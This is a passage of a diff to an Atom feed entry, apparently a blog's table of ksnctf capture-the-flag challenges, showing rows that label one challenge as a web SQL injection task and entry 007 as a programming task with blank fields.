+      <td>web</td>
+      <td>SQLインジェクション</td>
+    </tr>
+    <tr>
+      <td>007</td>
+      <td>Programming</td>
+      <td> </td>
+      <td> </td>
+    </tr>
+  </tbody>
+</table>]]></content><author><name></name></author><category term="contents" /><category term="tech" /><category term="CTF_ksnctf" /></entry></feed>
